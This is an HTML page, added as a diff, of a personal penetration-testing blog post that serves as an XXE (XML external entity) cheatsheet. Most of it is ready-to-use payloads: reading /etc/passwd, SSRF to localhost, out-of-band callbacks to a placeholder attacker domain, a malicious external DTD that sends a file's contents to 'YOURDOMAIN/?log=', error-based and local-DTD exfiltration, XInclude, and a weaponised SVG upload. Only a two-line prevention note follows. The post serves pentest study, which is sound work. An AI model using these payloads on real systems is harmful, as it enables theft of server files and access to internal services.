@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>XXE attack - Hato0 - Blog</title><meta name="Description" content="XXE cheatsheet"><meta property="og:title" content="XXE attack" />
+<meta property="og:description" content="XXE cheatsheet" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/penetration_testing/xxe/" /><meta property="article:section" content="posts" />
+
+<meta property="article:modified_time" content="2022-07-31T02:03:42+02:00" /><meta property="og:site_name" content="Hato0 - Blog" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="XXE attack"/>
+<meta name="twitter:description" content="XXE cheatsheet"/>
+<meta name="application-name" content="Hato0&#39;s journey">
+<meta name="apple-mobile-web-app-title" content="Hato0&#39;s journey"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://www.hato0.xyz/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/posts/penetration_testing/xxe/" /><link rel="next" href="/posts/penetration_testing/xss/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "XXE attack",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/posts\/penetration_testing\/xxe\/"
+        },"genre": "posts","keywords": "web, penetest, xxe","wordcount":  580 ,
+        "url": "\/posts\/penetration_testing\/xxe\/","dateModified": "2022-07-31T02:03:42+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hato0"
+            },"description": "XXE cheatsheet"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hato0 - Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.hato0.xyz/favicon.png"
+        data-srcset="https://www.hato0.xyz/favicon.png, https://www.hato0.xyz/favicon.png 1.5x, https://www.hato0.xyz/favicon.png 2x"
+        data-sizes="auto"
+        alt="https://www.hato0.xyz/favicon.png"
+        title="https://www.hato0.xyz/favicon.png" /></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hato0 - Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://www.hato0.xyz/favicon.png"
+        data-srcset="https://www.hato0.xyz/favicon.png, https://www.hato0.xyz/favicon.png 1.5x, https://www.hato0.xyz/favicon.png 2x"
+        data-sizes="auto"
+        alt="https://www.hato0.xyz/favicon.png"
+        title="https://www.hato0.xyz/favicon.png" /></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">XXE attack</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hato0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetest-web/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Penetest - Web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;580 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#basics">Basics</a></li>
+    <li><a href="#blind-xxe">Blind XXE</a></li>
+    <li><a href="#others-examples">Others examples</a></li>
+    <li><a href="#how-to-prevent-them">How to prevent them</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="xml-external-entity-injection">XML external entity injection</h1>
+<p>XXE is a specific attack against XML application. It can allow an attacker to view files, interact directly with the backend, or other application related to the corrupt one.</p>
+<p>This attack is perform as an initial vector for SSRF. To check for the vulnerability you will have to intercept the request and change the post data. Post data are used in 99.99% for XML applications.</p>
+<h2 id="basics">Basics</h2>
+<ul>
+<li>
+<p>External entities to retrieve files</p>
+<p>Simple payload to retrieve a file from the filesystem</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE test \[ &lt;!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> \]&gt;</span></span></code></pre></div>
+</li>
+<li>
+<p>Perform SSRF attacks</p>
+<p>As the previous one simple payload, you can adapt the IP by using URL to fetch APIs or whatever</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE test \[ &lt;!ENTITY xxe SYSTEM &#34;http://127.0.0.1/&#34;&gt;</span> \]&gt;</span></span></code></pre></div>
+</li>
+</ul>
+<h2 id="blind-xxe">Blind XXE</h2>
+<ul>
+<li>
+<p>Out-of-band interaction</p>
+<p>In this attack you will use the same payload as for the SSRF combined attack, but you will use your IP to check for inbound traffic.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE test \[ &lt;!ENTITY xxe SYSTEM &#34;YOUR_DOMAIN_OR_IP&#34;&gt;</span> \]&gt;</span></span></code></pre></div>
+</li>
+<li>
+<p>Out-of-band interaction via XML parameter entities</p>
+<p>Same principle and a similar payload but two different test</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE stockCheck \[&lt;!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM &#34;YOUR_DOMAIN_OR_IP&#34;&gt;</span> %xxe; \]&gt;</span></span></code></pre></div>
+</li>
+<li>
+<p>Exfiltrate data using a malicious external DTD</p>
+<p>First, DTD is a text file that store XML attributes and elements used by an application.
+This exfiltration has two phases:</p>
+<ol>
+<li>
+<p>You will have to host the DTD file on your website and it should be accessible for external use. This file should contain the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;file://FILE_PATH_TO_RETRIEVE&#34;&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;YOURDOMAIN/?log=%file;&#39;&gt;</span>&#34;&gt; 
+</span></span><span class="line"><span class="cl">%eval;  
+</span></span><span class="line"><span class="cl">%exfil;</span></span></code></pre></div>
+</li>
+<li>
+<p>Then exploit as you will do an classical exfiltration but you should specify the DTD file as follow :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &#34;DTD_URL&#34;&gt;</span> %xxe;]&gt;</span></span></code></pre></div>
+</li>
+<li>
+<p>Now you should tcpdump or go to your website logs to view the file you want to retrieve.</p>
+</li>
+</ol>
+</li>
+<li>
+<p>Retrieve data via error messages</p>
+<p>This attack has the same action than the external DTD we saw previously. You just need to replace the step 1 payload with the following one:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;file://FILE_PATH_TO_RETRIEVE&#34;&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;file:///invalid/%file;&#39;&gt;</span>&#34;&gt;  
+</span></span><span class="line"><span class="cl">%eval;  
+</span></span><span class="line"><span class="cl">%exfil;</span></span></code></pre></div>
+<p>This will throw an error containing the file you specify</p>
+</li>
+<li>
+<p>Retrieve data by repurposing a local DTD</p>
+<p>For this one you need to find a local DTD on the system. Once you get it you can simply redeclare a function and trigger for example the error based exfiltration. In this example we suppose that the local file is  <code>DTD_LOCAL_FILE</code> and the entity inside is called <code>PWNME</code>. The following payload is to include on the XML post data :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE message [
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % local_dtd SYSTEM &#34;file://DTD_LOCAL_FILE&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % PWNME &#39;
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file://FILE_PATH_TO_RETRIEVE&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;#x25;</span>eval;
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;#x25;</span>error;
+</span></span><span class="line"><span class="cl">&#39;&gt;
+</span></span><span class="line"><span class="cl">%local_dtd;
+</span></span><span class="line"><span class="cl">]&gt;</span></span></code></pre></div>
+</li>
+</ul>
+<h2 id="others-examples">Others examples</h2>
+<ul>
+<li>
+<p>Exploiting XInclude to retrieve files</p>
+<p>Back to basics, simple efficient payload :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;foo</span> <span class="na">xmlns:xi=</span><span class="s">&#34;http://www.w3.org/2001/XInclude&#34;</span><span class="nt">&gt;&lt;xi:include</span> <span class="na">parse=</span><span class="s">&#34;text&#34;</span> <span class="na">href=</span><span class="s">&#34;file://FILE_PATH_TO_RETRIEVE&#34;</span><span class="nt">/&gt;&lt;/foo&gt;</span></span></span></code></pre></div>
+</li>
+<li>
+<p>Exploiting XXE via image file upload</p>
+<p>For this attack you will have to prepare a SVG file containing the following payload and adapt parameters :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file://FILE_PATH_TO_RETRIEVE&#34; &gt;</span> ]&gt;<span class="nt">&lt;svg</span> <span class="na">width=</span><span class="s">&#34;128px&#34;</span> <span class="na">height=</span><span class="s">&#34;128px&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span> <span class="na">xmlns:xlink=</span><span class="s">&#34;http://www.w3.org/1999/xlink&#34;</span> <span class="na">version=</span><span class="s">&#34;1.1&#34;</span><span class="nt">&gt;&lt;text</span> <span class="na">font-size=</span><span class="s">&#34;16&#34;</span> <span class="na">x=</span><span class="s">&#34;0&#34;</span> <span class="na">y=</span><span class="s">&#34;16&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/text&gt;&lt;/svg&gt;</span></span></span></code></pre></div>
+<p>Then just upload it as an image and you should have the file data in your image display</p>
+</li>
+</ul>
+<h2 id="how-to-prevent-them">How to prevent them</h2>
+<p>XXE exist due to bad handle of user input or used of dangerous function in used librairie.
+The best way to prevent them is to include only necessaries functions or remove unnecessaries ones.</p>
+<p>Import ones to disable are <code>XInclude</code> and <code>external entities resolutions</code></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-07-31&nbsp;<a class="git-hash" href="https://github.com/Hato0/hato0.github.io/commit/02b9e6828ecc16327c52f49965c0c7f82446149a" target="_blank" title="commit by Hato0(contact@hato0.xyz) 02b9e6828ecc16327c52f49965c0c7f82446149a: Added C2Hunter project article">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>02b9e68</a></span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/penetration_testing/xxe/" data-title="XXE attack" data-hashtags="web,penetest,xxe"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/posts/penetration_testing/xxe/" data-hashtag="web"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="/posts/penetration_testing/xxe/" data-title="XXE attack"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="/posts/penetration_testing/xxe/" data-title="XXE attack"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="/posts/penetration_testing/xxe/" data-title="XXE attack"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/penetest/">penetest</a>,&nbsp;<a href="/tags/xxe/">xxe</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/posts/penetration_testing/xss/" class="next" rel="next" title="XSS attack">XSS attack<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">hato0 dedicated blog @2022</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
